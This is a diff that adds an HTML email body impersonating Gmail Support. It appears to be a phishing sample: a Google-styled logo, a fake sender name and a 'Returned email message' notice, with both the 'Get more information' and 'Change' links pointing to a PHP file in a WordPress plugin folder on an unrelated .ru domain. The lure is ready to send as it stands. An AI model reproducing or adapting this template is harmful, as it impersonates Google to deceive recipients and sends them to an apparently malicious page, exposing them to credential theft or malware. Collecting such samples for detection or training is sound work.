@@ -1,0 +1,30 @@
+<table cellspacing="0" cellpadding="0" style="font-family:arial; font-size:13px; color:#333; border:solid 1px #f2f2f2; width:100%">
+<tbody>
+<tr>
+<td align="right" style="background:#fff; padding:10px">
+<table cellspacing="0" cellpadding="0" border="0">
+<tbody>
+<tr>
+<td style="font-family:times; font-size:32px; color:#1448ef; padding-right:10px">
+G<span style="color:#de1b2f">o</span><span style="color:#fbaf0d">o</span>g<span style="color:#019913">l</span><span style="color:#de1b2f">e</span></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td style="padding:0px 10px 10px 10px"><span style="color:#333">Claire Holmes</span> (Gmail Support) has sent you a message:<br>
+<br>
+2/09/2017<br>
+<b>Returned email message.</b><br>
+<br>
+<a href="http://www.new.reklam-as.ru/wp-content/plugins/envira-gallery-lite/includes/commutativity.php" target="_blank" style="color:#245dc1">Get more information</a> </td>
+</tr>
+<tr>
+<td style="padding:10px"><input value="View messages" type="submit" style="margin:0px; font-family:arial; display:inline-block; padding:7px 15px; background:#5284d4; color:#fff; font-size:13px; font-weight:bold; border:solid 1px #245dc1; white-space:nowrap; text-decoration:none"> </td>
+</tr>
+<tr>
+<td style="font-size:11px; padding:10px">Don't want occasional updates about Google activity? <a href="http://www.new.reklam-as.ru/wp-content/plugins/envira-gallery-lite/includes/commutativity.php" target="_blank" style="color:#245dc1; text-decoration:none">Change</a> what email Gmail Support sends you. </td>
+</tr>
+</tbody>
+</table>
